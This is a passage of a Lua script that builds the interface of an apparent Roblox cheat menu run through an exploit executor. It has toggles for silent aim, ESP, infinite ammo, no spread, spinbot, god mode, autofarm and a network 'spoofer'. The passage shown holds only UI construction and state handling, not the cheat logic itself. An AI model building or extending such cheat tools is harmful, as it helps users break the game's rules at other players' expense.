    Row1 = Instance.new("Frame"),
    Label = Instance.new("TextLabel"),
    Track = Instance.new("Frame"),
    Fill = Instance.new("Frame"),
    FillGradient = Instance.new("UIGradient"),
    UICorner_8 = Instance.new("UICorner"),
    Knob = Instance.new("Frame"),
    UICorner_9 = Instance.new("UICorner"),
    UICorner_10 = Instance.new("UICorner"),
    Hit = Instance.new("TextButton"),
    UICorner_11 = Instance.new("UICorner"),
    UICorner_12 = Instance.new("UICorner"),
}

SPHUI.SPHUI.Name = "SPHUI"
SPHUI.SPHUI.Parent = getgui()
SPHUI.SPHUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
SPHUI.SPHUI.ResetOnSpawn = false
uiroot = SPHUI.SPHUI
getgenv().sphcleanup.gui = SPHUI.SPHUI

SPHUI.Main.Name = "Main"
SPHUI.Main.Parent = SPHUI.SPHUI
SPHUI.Main.BackgroundColor3 = Color3.fromRGB(12, 12, 16)
SPHUI.Main.BorderSizePixel = 0
SPHUI.Main.ClipsDescendants = true
SPHUI.Main.Position = UDim2.new(0.5, -225, 0.5, -147)
SPHUI.Main.Size = UDim2.new(0, 450, 0, 294)

SPHUI.MainScale.Name = "MainScale"
SPHUI.MainScale.Parent = SPHUI.Main

SPHUI.Top.Name = "Top"
SPHUI.Top.Parent = SPHUI.Main
SPHUI.Top.BackgroundColor3 = Color3.fromRGB(16, 16, 22)
SPHUI.Top.BorderSizePixel = 0
SPHUI.Top.Size = UDim2.new(1, 0, 0, 32)

SPHUI.Title.Name = "Title"
SPHUI.Title.Parent = SPHUI.Top
SPHUI.Title.BackgroundTransparency = 1.000
SPHUI.Title.Position = UDim2.new(0, 14, 0, 0)
SPHUI.Title.Size = UDim2.new(1, -80, 1, 0)
SPHUI.Title.Font = Enum.Font.GothamBold
SPHUI.Title.Text = "SPH // RIGGED DA GAEM!!!"
SPHUI.Title.TextColor3 = Color3.fromRGB(235, 235, 240)
SPHUI.Title.TextSize = 12.000
SPHUI.Title.TextXAlignment = Enum.TextXAlignment.Left

SPHUI.Accent.Name = "Accent"
SPHUI.Accent.Parent = SPHUI.Top
SPHUI.Accent.BackgroundColor3 = Color3.fromRGB(200, 200, 215)
SPHUI.Accent.BorderSizePixel = 0
SPHUI.Accent.Position = UDim2.new(0, 0, 1, -1)
SPHUI.Accent.Size = UDim2.new(1, 0, 0, 1)

SPHUI.GlossGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(160, 160, 180))}
SPHUI.GlossGradient.Rotation = 90
SPHUI.GlossGradient.Transparency = NumberSequence.new{NumberSequenceKeypoint.new(0.00, 0.20), NumberSequenceKeypoint.new(1.00, 0.75)}
SPHUI.GlossGradient.Name = "GlossGradient"
SPHUI.GlossGradient.Parent = SPHUI.Accent

SPHUI.MinBtn.Name = "MinBtn"
SPHUI.MinBtn.Parent = SPHUI.Top
SPHUI.MinBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 32)
SPHUI.MinBtn.BorderSizePixel = 0
SPHUI.MinBtn.Position = UDim2.new(1, -30, 0.5, -11)
SPHUI.MinBtn.Size = UDim2.new(0, 22, 0, 22)
SPHUI.MinBtn.AutoButtonColor = false
SPHUI.MinBtn.Font = Enum.Font.GothamBold
SPHUI.MinBtn.Text = "_"
SPHUI.MinBtn.TextColor3 = Color3.fromRGB(200, 200, 210)
SPHUI.MinBtn.TextSize = 13.000

SPHUI.BtnGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(46, 46, 58)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(22, 22, 30))}
SPHUI.BtnGradient.Rotation = 90
SPHUI.BtnGradient.Name = "BtnGradient"
SPHUI.BtnGradient.Parent = SPHUI.MinBtn

SPHUI.UICorner.CornerRadius = UDim.new(0, 4)
SPHUI.UICorner.Parent = SPHUI.MinBtn

SPHUI.BarGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(42, 42, 54)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(20, 20, 27))}
SPHUI.BarGradient.Rotation = 90
SPHUI.BarGradient.Name = "BarGradient"
SPHUI.BarGradient.Parent = SPHUI.Top

SPHUI.Side.Name = "Side"
SPHUI.Side.Parent = SPHUI.Main
SPHUI.Side.BackgroundColor3 = Color3.fromRGB(14, 14, 20)
SPHUI.Side.BorderSizePixel = 0
SPHUI.Side.Position = UDim2.new(0, 0, 0, 32)
SPHUI.Side.Size = UDim2.new(0, 120, 1, -32)

SPHUI.NavLabel.Name = "NavLabel"
SPHUI.NavLabel.Parent = SPHUI.Side
SPHUI.NavLabel.BackgroundTransparency = 1.000
SPHUI.NavLabel.Position = UDim2.new(0, 12, 0, 10)
SPHUI.NavLabel.Size = UDim2.new(1, -24, 0, 12)
SPHUI.NavLabel.Font = Enum.Font.GothamBold
SPHUI.NavLabel.Text = "NAVIGATION"
SPHUI.NavLabel.TextColor3 = Color3.fromRGB(100, 100, 115)
SPHUI.NavLabel.TextSize = 10.000
SPHUI.NavLabel.TextXAlignment = Enum.TextXAlignment.Left

SPHUI.Divider.Name = "Divider"
SPHUI.Divider.Parent = SPHUI.Side
SPHUI.Divider.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
SPHUI.Divider.BorderSizePixel = 0
SPHUI.Divider.Position = UDim2.new(0, 12, 0, 28)
SPHUI.Divider.Size = UDim2.new(1, -24, 0, 1)

SPHUI.TabIndicator.Name = "TabIndicator"
SPHUI.TabIndicator.Parent = SPHUI.Side
SPHUI.TabIndicator.BackgroundColor3 = Color3.fromRGB(220, 220, 235)
SPHUI.TabIndicator.BorderSizePixel = 0
SPHUI.TabIndicator.Position = UDim2.new(0, 8, 0, 38)
SPHUI.TabIndicator.Size = UDim2.new(0, 2, 0, 28)
SPHUI.TabIndicator.ZIndex = 2

SPHUI.IndicatorGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(170, 170, 195))}
SPHUI.IndicatorGradient.Rotation = 90
SPHUI.IndicatorGradient.Name = "IndicatorGradient"
SPHUI.IndicatorGradient.Parent = SPHUI.TabIndicator

SPHUI.UICorner_2.CornerRadius = UDim.new(0, 2)
SPHUI.UICorner_2.Parent = SPHUI.TabIndicator

SPHUI.TabAim.Name = "TabAim"
SPHUI.TabAim.Parent = SPHUI.Side
SPHUI.TabAim.BackgroundColor3 = Color3.fromRGB(14, 14, 20)
SPHUI.TabAim.BorderSizePixel = 0
SPHUI.TabAim.Position = UDim2.new(0, 8, 0, 38)
SPHUI.TabAim.Size = UDim2.new(1, -16, 0, 28)
SPHUI.TabAim.AutoButtonColor = false
SPHUI.TabAim.Font = Enum.Font.GothamMedium
SPHUI.TabAim.Text = "   AIM"
SPHUI.TabAim.TextColor3 = Color3.fromRGB(160, 160, 175)
SPHUI.TabAim.TextSize = 11.000
SPHUI.TabAim.TextXAlignment = Enum.TextXAlignment.Left

SPHUI.UICorner_3.CornerRadius = UDim.new(0, 4)
SPHUI.UICorner_3.Parent = SPHUI.TabAim

SPHUI.TabWep.Name = "TabWep"
SPHUI.TabWep.Parent = SPHUI.Side
SPHUI.TabWep.BackgroundColor3 = Color3.fromRGB(14, 14, 20)
SPHUI.TabWep.BorderSizePixel = 0
SPHUI.TabWep.Position = UDim2.new(0, 8, 0, 70)
SPHUI.TabWep.Size = UDim2.new(1, -16, 0, 28)
SPHUI.TabWep.AutoButtonColor = false
SPHUI.TabWep.Font = Enum.Font.GothamMedium
SPHUI.TabWep.Text = "   WEAPON"
SPHUI.TabWep.TextColor3 = Color3.fromRGB(160, 160, 175)
SPHUI.TabWep.TextSize = 11.000
SPHUI.TabWep.TextXAlignment = Enum.TextXAlignment.Left

SPHUI.UICorner_4.CornerRadius = UDim.new(0, 4)
SPHUI.UICorner_4.Parent = SPHUI.TabWep

SPHUI.TabVis.Name = "TabVis"
SPHUI.TabVis.Parent = SPHUI.Side
SPHUI.TabVis.BackgroundColor3 = Color3.fromRGB(14, 14, 20)
SPHUI.TabVis.BorderSizePixel = 0
SPHUI.TabVis.Position = UDim2.new(0, 8, 0, 102)
SPHUI.TabVis.Size = UDim2.new(1, -16, 0, 28)
SPHUI.TabVis.AutoButtonColor = false
SPHUI.TabVis.Font = Enum.Font.GothamMedium
SPHUI.TabVis.Text = "   VISUALS"
SPHUI.TabVis.TextColor3 = Color3.fromRGB(160, 160, 175)
SPHUI.TabVis.TextSize = 11.000
SPHUI.TabVis.TextXAlignment = Enum.TextXAlignment.Left

SPHUI.UICorner_5.CornerRadius = UDim.new(0, 4)
SPHUI.UICorner_5.Parent = SPHUI.TabVis

SPHUI.TabExp.Name = "TabExp"
SPHUI.TabExp.Parent = SPHUI.Side
SPHUI.TabExp.BackgroundColor3 = Color3.fromRGB(14, 14, 20)
SPHUI.TabExp.BorderSizePixel = 0
SPHUI.TabExp.Position = UDim2.new(0, 8, 0, 134)
SPHUI.TabExp.Size = UDim2.new(1, -16, 0, 28)
SPHUI.TabExp.AutoButtonColor = false
SPHUI.TabExp.Font = Enum.Font.GothamMedium
SPHUI.TabExp.Text = "   EXPLOITS"
SPHUI.TabExp.TextColor3 = Color3.fromRGB(160, 160, 175)
SPHUI.TabExp.TextSize = 11.000
SPHUI.TabExp.TextXAlignment = Enum.TextXAlignment.Left

SPHUI.UICorner_6.CornerRadius = UDim.new(0, 4)
SPHUI.UICorner_6.Parent = SPHUI.TabExp

SPHUI.TabThm.Name = "TabThm"
SPHUI.TabThm.Parent = SPHUI.Side
SPHUI.TabThm.BackgroundColor3 = Color3.fromRGB(14, 14, 20)
SPHUI.TabThm.BorderSizePixel = 0
SPHUI.TabThm.Position = UDim2.new(0, 8, 0, 166)
SPHUI.TabThm.Size = UDim2.new(1, -16, 0, 28)
SPHUI.TabThm.AutoButtonColor = false
SPHUI.TabThm.Font = Enum.Font.GothamMedium
SPHUI.TabThm.Text = "   THEMES"
SPHUI.TabThm.TextColor3 = Color3.fromRGB(160, 160, 175)
SPHUI.TabThm.TextSize = 11.000
SPHUI.TabThm.TextXAlignment = Enum.TextXAlignment.Left

SPHUI.UICorner_7.CornerRadius = UDim.new(0, 4)
SPHUI.UICorner_7.Parent = SPHUI.TabThm

SPHUI.Content.Name = "Content"
SPHUI.Content.Parent = SPHUI.Main
SPHUI.Content.BackgroundTransparency = 1.000
SPHUI.Content.Position = UDim2.new(0, 120, 0, 32)
SPHUI.Content.Size = UDim2.new(1, -120, 1, -32)

SPHUI.Head.Name = "Head"
SPHUI.Head.Parent = SPHUI.Content
SPHUI.Head.BackgroundTransparency = 1.000
SPHUI.Head.Position = UDim2.new(0, 14, 0, 8)
SPHUI.Head.Size = UDim2.new(1, -28, 0, 14)
SPHUI.Head.Font = Enum.Font.GothamBold
SPHUI.Head.Text = "AIM ASSIST"
SPHUI.Head.TextColor3 = Color3.fromRGB(235, 235, 240)
SPHUI.Head.TextSize = 11.000
SPHUI.Head.TextXAlignment = Enum.TextXAlignment.Left

SPHUI.Sub.Name = "Sub"
SPHUI.Sub.Parent = SPHUI.Content
SPHUI.Sub.BackgroundTransparency = 1.000
SPHUI.Sub.Position = UDim2.new(0, 14, 0, 22)
SPHUI.Sub.Size = UDim2.new(1, -28, 0, 10)
SPHUI.Sub.Font = Enum.Font.Gotham
SPHUI.Sub.Text = "Configure aim settings"
SPHUI.Sub.TextColor3 = Color3.fromRGB(100, 100, 115)
SPHUI.Sub.TextSize = 9.000
SPHUI.Sub.TextXAlignment = Enum.TextXAlignment.Left

SPHUI.PgAim.Name = "PgAim"
SPHUI.PgAim.Parent = SPHUI.Content
SPHUI.PgAim.BackgroundTransparency = 1.000
SPHUI.PgAim.BorderSizePixel = 0
SPHUI.PgAim.Position = UDim2.new(0, 12, 0, 40)
SPHUI.PgAim.Size = UDim2.new(1, -24, 1, -48)
SPHUI.PgAim.CanvasPosition = Vector2.new(0, 34)
SPHUI.PgAim.CanvasSize = UDim2.new(0, 0, 0, 0)
SPHUI.PgAim.ScrollBarThickness = 3

SPHUI.UIListLayout.Parent = SPHUI.PgAim
SPHUI.UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
SPHUI.UIListLayout.Padding = UDim.new(0, 4)

SPHUI.Row1.Name = "Row1"
SPHUI.Row1.Parent = SPHUI.PgAim
SPHUI.Row1.BackgroundColor3 = Color3.fromRGB(18, 18, 26)
SPHUI.Row1.BorderSizePixel = 0
SPHUI.Row1.LayoutOrder = 1
SPHUI.Row1.Size = UDim2.new(1, -16, 0, 32)
SPHUI.Row1:SetAttribute("RowType", "Toggle")
SPHUI.Row1:SetAttribute("Key", "silentaim")
SPHUI.Row1:SetAttribute("Default", true)

SPHUI.Label.Name = "Label"
SPHUI.Label.Parent = SPHUI.Row1
SPHUI.Label.BackgroundTransparency = 1.000
SPHUI.Label.Position = UDim2.new(0, 12, 0, 0)
SPHUI.Label.Size = UDim2.new(0.620000005, -8, 1, 0)
SPHUI.Label.Font = Enum.Font.GothamMedium
SPHUI.Label.Text = "Silent Aim"
SPHUI.Label.TextColor3 = Color3.fromRGB(210, 210, 225)
SPHUI.Label.TextSize = 11.000
SPHUI.Label.TextXAlignment = Enum.TextXAlignment.Left

SPHUI.Track.Name = "Track"
SPHUI.Track.Parent = SPHUI.Row1
SPHUI.Track.AnchorPoint = Vector2.new(1, 0.5)
SPHUI.Track.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
SPHUI.Track.BorderSizePixel = 0
SPHUI.Track.Position = UDim2.new(1, -10, 0.5, 0)
SPHUI.Track.Size = UDim2.new(0, 34, 0, 18)

SPHUI.Fill.Name = "Fill"
SPHUI.Fill.Parent = SPHUI.Track
SPHUI.Fill.BackgroundColor3 = Color3.fromRGB(200, 200, 215)
SPHUI.Fill.BorderSizePixel = 0
SPHUI.Fill.Size = UDim2.new(1, 0, 1, 0)

SPHUI.FillGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(180, 180, 200))}
SPHUI.FillGradient.Rotation = 90
SPHUI.FillGradient.Name = "FillGradient"
SPHUI.FillGradient.Parent = SPHUI.Fill

SPHUI.UICorner_8.CornerRadius = UDim.new(1, 0)
SPHUI.UICorner_8.Parent = SPHUI.Fill

SPHUI.Knob.Name = "Knob"
SPHUI.Knob.Parent = SPHUI.Track
SPHUI.Knob.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
SPHUI.Knob.BorderSizePixel = 0
SPHUI.Knob.Position = UDim2.new(1, -16, 0.5, -7)
SPHUI.Knob.Size = UDim2.new(0, 14, 0, 14)

SPHUI.UICorner_9.CornerRadius = UDim.new(1, 0)
SPHUI.UICorner_9.Parent = SPHUI.Knob

SPHUI.UICorner_10.CornerRadius = UDim.new(1, 0)
SPHUI.UICorner_10.Parent = SPHUI.Track

SPHUI.Hit.Name = "Hit"
SPHUI.Hit.Parent = SPHUI.Row1
SPHUI.Hit.BackgroundTransparency = 1.000
SPHUI.Hit.Size = UDim2.new(1, 0, 1, 0)
SPHUI.Hit.AutoButtonColor = false
SPHUI.Hit.Text = ""

SPHUI.UICorner_11.CornerRadius = UDim.new(0, 4)
SPHUI.UICorner_11.Parent = SPHUI.Hit

SPHUI.UICorner_12.CornerRadius = UDim.new(0, 6)
SPHUI.UICorner_12.Parent = SPHUI.Row1

-- ═══════════════════════════════════════════════════════════════
-- ROW GENERATOR — because typing 200 Instance.new calls is suffering
-- ═══════════════════════════════════════════════════════════════
local function mkrow(par, order, label, rowType, key, default, options)
    local r = Instance.new("Frame")
    r.Name = "Row_" .. tostring(order)
    r.BackgroundColor3 = Color3.fromRGB(18, 18, 26)
    r.BorderSizePixel = 0
    r.LayoutOrder = order
    r.Size = UDim2.new(1, -16, 0, 32)
    r:SetAttribute("RowType", rowType)
    r:SetAttribute("Key", key)
    if options then r:SetAttribute("Options", options) end
    if default ~= nil then r:SetAttribute("Default", default) end
    Instance.new("UICorner", r).CornerRadius = UDim.new(0, 6)

    local lbl = Instance.new("TextLabel", r)
    lbl.Name = "Label"
    lbl.BackgroundTransparency = 1
    lbl.Position = UDim2.new(0, 12, 0, 0)
    lbl.Size = UDim2.new(0.62, -8, 1, 0)
    lbl.Font = Enum.Font.GothamMedium
    lbl.Text = label
    lbl.TextColor3 = Color3.fromRGB(210, 210, 225)
    lbl.TextSize = 11
    lbl.TextXAlignment = Enum.TextXAlignment.Left

    if rowType == "Toggle" then
        local trk = Instance.new("Frame", r)
        trk.Name = "Track"
        trk.AnchorPoint = Vector2.new(1, 0.5)
        trk.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
        trk.BorderSizePixel = 0
        trk.Position = UDim2.new(1, -10, 0.5, 0)
        trk.Size = UDim2.new(0, 34, 0, 18)
        Instance.new("UIStroke", trk).Color = Color3.fromRGB(60, 60, 75)
        Instance.new("UICorner", trk).CornerRadius = UDim.new(1, 0)

        local fl = Instance.new("Frame", trk)
        fl.Name = "Fill"
        fl.BackgroundColor3 = Color3.fromRGB(200, 200, 215)
        fl.BorderSizePixel = 0
        fl.Size = UDim2.new(default and 1 or 0, 0, 1, 0)
        Instance.new("UICorner", fl).CornerRadius = UDim.new(1, 0)

        local knob = Instance.new("Frame", trk)
        knob.Name = "Knob"
        knob.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
        knob.BorderSizePixel = 0
        knob.Position = default and UDim2.new(1, -16, 0.5, -7) or UDim2.new(0, 2, 0.5, -7)
        knob.Size = UDim2.new(0, 14, 0, 14)
        Instance.new("UICorner", knob).CornerRadius = UDim.new(1, 0)

        local hit = Instance.new("TextButton", r)
        hit.Name = "Hit"
        hit.BackgroundTransparency = 1
        hit.Size = UDim2.new(1, 0, 1, 0)
        hit.Text = ""

    elseif rowType == "TextBox" then
        local val = Instance.new("TextBox", r)
        val.Name = "Value"
        val.AnchorPoint = Vector2.new(1, 0)
        val.BackgroundColor3 = Color3.fromRGB(10, 10, 14)
        val.BorderSizePixel = 0
        val.Position = UDim2.new(1, -10, 0.5, -11)
        val.Size = UDim2.new(0, 70, 0, 22)
        val.ClearTextOnFocus = false
        val.Font = Enum.Font.GothamBold
        val.Text = tostring(default or "")
        val.TextColor3 = Color3.fromRGB(235, 235, 240)
        val.TextSize = 11
        Instance.new("UICorner", val).CornerRadius = UDim.new(0, 4)
        Instance.new("UIStroke", val).Color = Color3.fromRGB(50, 50, 65)

    elseif rowType == "Cycler" then
        local val = Instance.new("TextButton", r)
        val.Name = "Value"
        val.AnchorPoint = Vector2.new(1, 0)
        val.BackgroundColor3 = Color3.fromRGB(10, 10, 14)
        val.BorderSizePixel = 0
        val.Position = UDim2.new(1, -10, 0.5, -11)
        val.Size = UDim2.new(0, 70, 0, 22)
        val.AutoButtonColor = false
        val.Font = Enum.Font.GothamBold
        val.Text = (default or "") .. " >"
        val.TextColor3 = Color3.fromRGB(235, 235, 240)
        val.TextSize = 10
        Instance.new("UICorner", val).CornerRadius = UDim.new(0, 4)
        Instance.new("UIStroke", val).Color = Color3.fromRGB(50, 50, 65)

    elseif rowType == "Slider" then
        local trk = Instance.new("Frame", r)
        trk.Name = "Track"
        trk.BackgroundColor3 = Color3.fromRGB(40, 40, 52)
        trk.BorderSizePixel = 0
        trk.Position = UDim2.new(0.53, 0, 0.5, -2)
        trk.Size = UDim2.new(0.38, 0, 0, 4)
        Instance.new("UICorner", trk).CornerRadius = UDim.new(1, 0)
        Instance.new("UIStroke", trk).Color = Color3.fromRGB(60, 60, 75)

        local fl = Instance.new("Frame", trk)
        fl.Name = "Fill"
        fl.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        fl.BorderSizePixel = 0
        fl.Size = UDim2.new((default or 0) / 255, 0, 1, 0)
        Instance.new("UICorner", fl).CornerRadius = UDim.new(1, 0)

        local vl = Instance.new("TextLabel", r)
        vl.Name = "ValueLabel"
        vl.BackgroundTransparency = 1
        vl.Position = UDim2.new(1, -35, 0, 0)
        vl.Size = UDim2.new(0, 30, 1, 0)
        vl.Font = Enum.Font.GothamBold
        vl.Text = tostring(default or 0)
        vl.TextColor3 = Color3.fromRGB(235, 235, 240)
        vl.TextSize = 10

        local hit = Instance.new("TextButton", trk)
        hit.Name = "Hit"
        hit.BackgroundTransparency = 1
        hit.Size = UDim2.new(1, 0, 1, 0)
        hit.Text = ""
    end

    r.Parent = par
    return r
end

-- ── AIM PAGE additional rows ──
mkrow(SPHUI.PgAim, 2, "Show FOV", "Toggle", "showfov", true)
mkrow(SPHUI.PgAim, 3, "FOV Size", "TextBox", "fov", "250")
mkrow(SPHUI.PgAim, 4, "Hit Chance (%)", "TextBox", "hitchance", "100")
mkrow(SPHUI.PgAim, 5, "Hit Part", "Cycler", "hitpart", "Head", "Head,Torso,LowerTorso,Arms,Legs,Random")
mkrow(SPHUI.PgAim, 6, "Priority", "Cycler", "targetpriority", "Closest", "Closest,Lowest Health,Highest Health,Farthest")
mkrow(SPHUI.PgAim, 7, "Team Check", "Toggle", "teamcheck", false)

-- ── WEAPON PAGE ──
local PgWep = Instance.new("ScrollingFrame")
PgWep.Name = "PgWep"
PgWep.Parent = SPHUI.Content
PgWep.BackgroundTransparency = 1
PgWep.BorderSizePixel = 0
PgWep.Position = UDim2.new(0, 12, 0, 40)
PgWep.Size = UDim2.new(1, -24, 1, -48)
PgWep.Visible = false
PgWep.ScrollBarThickness = 3
local ll2 = Instance.new("UIListLayout", PgWep)
ll2.Padding = UDim.new(0, 4)
ll2.SortOrder = Enum.SortOrder.LayoutOrder

mkrow(PgWep, 1, "Recoil Multiplier", "TextBox", "recoilmult", "0.15")
mkrow(PgWep, 2, "No Camera Shake", "Toggle", "nocamshake", true)
mkrow(PgWep, 3, "Infinite Ammo", "Toggle", "infammo", true)
mkrow(PgWep, 4, "No Spread", "Toggle", "nospread", true)
mkrow(PgWep, 5, "Rapid Fire", "Toggle", "rapidfire", false)
mkrow(PgWep, 6, "Rapid Fire Rate", "TextBox", "rapidfirerate", "800")
mkrow(PgWep, 7, "Instant Reload", "Toggle", "instantreload", false)

-- ── VISUALS PAGE ──
local PgVis = Instance.new("ScrollingFrame")
PgVis.Name = "PgVis"
PgVis.Parent = SPHUI.Content
PgVis.BackgroundTransparency = 1
PgVis.BorderSizePixel = 0
PgVis.Position = UDim2.new(0, 12, 0, 40)
PgVis.Size = UDim2.new(1, -24, 1, -48)
PgVis.Visible = false
PgVis.ScrollBarThickness = 3
local ll3 = Instance.new("UIListLayout", PgVis)
ll3.Padding = UDim.new(0, 4)
ll3.SortOrder = Enum.SortOrder.LayoutOrder

mkrow(PgVis, 1, "PH (dont be dirty minded boy)", "Toggle", "esp", true)
mkrow(PgVis, 2, "Fullbright", "Toggle", "fullbright", false)
mkrow(PgVis, 3, "WalkSpeed", "TextBox", "walkspeed", "16")
mkrow(PgVis, 4, "Third Person", "Toggle", "thirdperson", false)
mkrow(PgVis, 5, "Custom Crosshair", "Toggle", "crosshair", true)
mkrow(PgVis, 6, "yoo what we can freecam now", "Toggle", "freecam", false)
mkrow(PgVis, 7, "Freecam Speed", "TextBox", "freecamspeed", "1")

-- ── EXPLOITS PAGE ──
local PgExp = Instance.new("ScrollingFrame")
PgExp.Name = "PgExp"
PgExp.Parent = SPHUI.Content
PgExp.BackgroundTransparency = 1
PgExp.BorderSizePixel = 0
PgExp.Position = UDim2.new(0, 12, 0, 40)
PgExp.Size = UDim2.new(1, -24, 1, -48)
PgExp.Visible = false
PgExp.ScrollBarThickness = 3
local ll4 = Instance.new("UIListLayout", PgExp)
ll4.Padding = UDim.new(0, 4)
ll4.SortOrder = Enum.SortOrder.LayoutOrder

mkrow(PgExp, 1, "TRIGGER DA PULL WAIT IDK", "Toggle", "triggerbot", false)
mkrow(PgExp, 2, "Auto Bunny Hop", "Toggle", "autobhop", false)
mkrow(PgExp, 3, "Autofarm (TP RISK)", "Toggle", "autofarm", false)
mkrow(PgExp, 4, "Farm Kills [Key: 0]", "Toggle", "farmkills", false)
mkrow(PgExp, 5, "Infinite Jump", "Toggle", "infjump", false)
mkrow(PgExp, 6, "Spinbot", "Toggle", "spinbot", false)
mkrow(PgExp, 7, "Spin Speed", "TextBox", "spinspeed", "15")
mkrow(PgExp, 8, "Anti-Aim (Jitter)", "Toggle", "antiaim", false)
mkrow(PgExp, 9, "Jitter Amount", "TextBox", "jitteramount", "90")
mkrow(PgExp, 10, "God Mode", "Toggle", "godmode", false)
mkrow(PgExp, 11, "BridgeNet Spoofer", "Toggle", "spamfire", false)

-- ── THEMES PAGE ──
local PgThm = Instance.new("ScrollingFrame")
PgThm.Name = "PgThm"
PgThm.Parent = SPHUI.Content
PgThm.BackgroundTransparency = 1
PgThm.BorderSizePixel = 0
PgThm.Position = UDim2.new(0, 12, 0, 40)
PgThm.Size = UDim2.new(1, -24, 1, -48)
PgThm.Visible = false
PgThm.ScrollBarThickness = 3
local ll5 = Instance.new("UIListLayout", PgThm)
ll5.Padding = UDim.new(0, 4)
ll5.SortOrder = Enum.SortOrder.LayoutOrder

mkrow(PgThm, 1, "Accent R", "Slider", "accentr", 255)
mkrow(PgThm, 2, "Accent G", "Slider", "accentg", 255)
mkrow(PgThm, 3, "Accent B", "Slider", "accentb", 255)

local presets = {
    {n = "Midnight", r = 255, g = 255, b = 255},
    {n = "Ice", r = 100, g = 200, b = 255},
    {n = "Blood", r = 255, g = 55, b = 55},
    {n = "Neon", r = 50, g = 255, b = 120},
    {n = "Royal", r = 170, g = 80, b = 255},
    {n = "Sunset", r = 255, g = 140, b = 60},
    {n = "Cyber", r = 0, g = 220, b = 255},
    {n = "Rose", r = 255, g = 105, b = 180},
    {n = "Gold", r = 255, g = 200, b = 50},
    {n = "Toxic", r = 180, g = 255, b = 0},
    {n = "Vaporwave", r = 255, g = 95, b = 235},
    {n = "Ocean", r = 40, g = 130, b = 255},
    {n = "Ember", r = 255, g = 110, b = 50},
    {n = "Mint", r = 90, g = 255, b = 190},
    {n = "Mono", r = 235, g = 235, b = 235},
}
for i, pr in ipairs(presets) do
    local rw = mkrow(PgThm, 10 + i, pr.n, "ThemeButton", nil, nil)
    rw:FindFirstChild("Label").Size = UDim2.new(0.4, -8, 1, 0)
    local ap = Instance.new("TextButton", rw)
    ap.Name = "Apply"
    ap.AnchorPoint = Vector2.new(1, 0)
    ap.BackgroundColor3 = Color3.fromRGB(25, 25, 32)
    ap.BorderSizePixel = 0
    ap.Position = UDim2.new(1, -10, 0.5, -11)
    ap.Size = UDim2.new(0, 90, 0, 22)
    ap.AutoButtonColor = false
    ap.Font = Enum.Font.GothamMedium
    ap.Text = pr.n
    ap.TextColor3 = Color3.fromRGB(220, 220, 230)
    ap.TextSize = 10
    Instance.new("UICorner", ap).CornerRadius = UDim.new(0, 4)
    Instance.new("UIStroke", ap).Color = Color3.fromRGB(55, 55, 70)
    ap:SetAttribute("R", pr.r)
    ap:SetAttribute("G", pr.g)
    ap:SetAttribute("B", pr.b)
end

-- The rest of the rows are generated by the script loop below, 
-- because making 180 manual instances is a fate worse than death. 
-- If it aint broke dont fix it.

-- Scripts:
local function PLGJ_fake_script()
    local script = Instance.new('LocalScript', SPHUI.SPHUI)

    --[[
        the ui is real instances, this script just gives them brains
        (the brains were locally sourced and free range)
    ]]

    local Players = game:GetService("Players")
    local UIS     = game:GetService("UserInputService")
    local TS      = game:GetService("TweenService")
    local lplr    = Players.LocalPlayer

    -- services (4 ball)
    local gui  = script.Parent
    local main = gui:WaitForChild("Main")
    local top  = main:WaitForChild("Top")
    local side = main:WaitForChild("Side")
    local content = main:WaitForChild("Content")

    local minBtn   = top:WaitForChild("MinBtn")
    local title    = top:WaitForChild("Title")
    local accent   = top:WaitForChild("Accent")
    local tabIndicator = side:WaitForChild("TabIndicator")
    local head = content:WaitForChild("Head")
    local sub  = content:WaitForChild("Sub")

    -- local visual state only
    -- the big book of yes and no
    local state = {
        silentaim = true,  showfov = true,  fov = 250, teamcheck = false,
        hitchance = 100,   hitpart = "Head", targetpriority = "Closest",
        recoilmult = 0.15, nocamshake = true, infammo = true, nospread = true,
        walkspeed = 16,    esp = true,      fullbright = false,
        infjump = false,   rapidfire = false, rapidfirerate = 800, instantreload = false,
        triggerbot = false, autobhop = false, autofarm = false, farmkills = false,
        thirdperson = false, spinbot = false, spinspeed = 15,
        antiaim = false,    jitteramount = 90,
        godmode = false,    crosshair = true,
        freecam = false,    freecamspeed = 1,
        spamfire = false,
        theme = { accentr = 255, accentg = 255, accentb = 255 },
    }

    getgenv().sphui_state = state

    getgenv().sph_update_ui = function(key, val)
        if state[key] ~= nil then
            state[key] = val
            for _, r in ipairs(content:GetDescendants()) do
                if r:IsA("Frame") and r:GetAttribute("Key") == key and r:GetAttribute("RowType") == "Toggle" then
                    local trk = r:FindFirstChild("Track")
                    if trk then
                        local fl = trk:FindFirstChild("Fill")
                        local knob = trk:FindFirstChild("Knob")
                        if fl and knob then
                            local gF = UDim2.fromScale(val and 1 or 0, 1)
                            local gP = val and UDim2.new(1, -16, 0.5, -7) or UDim2.new(0, 2, 0.5, -7)
                            TS:Create(fl, TweenInfo.new(0.15), { Size = gF }):Play()
                            TS:Create(knob, TweenInfo.new(0.15), { Position = gP }):Play()
                        end
                    end
                end
            end
        end
    end

    -- applies the accent color across the whole ui
    -- one color to rule them all (ref)
    local function applytheme()
        local a = Color3.fromRGB(state.theme.accentr, state.theme.accentg, state.theme.accentb)
        accent.BackgroundColor3 = a
        title.TextColor3 = a
        tabIndicator.BackgroundColor3 = a
        -- wire every row in every page
        -- paint job time, everybody gets the same color whether they like it or not hehe
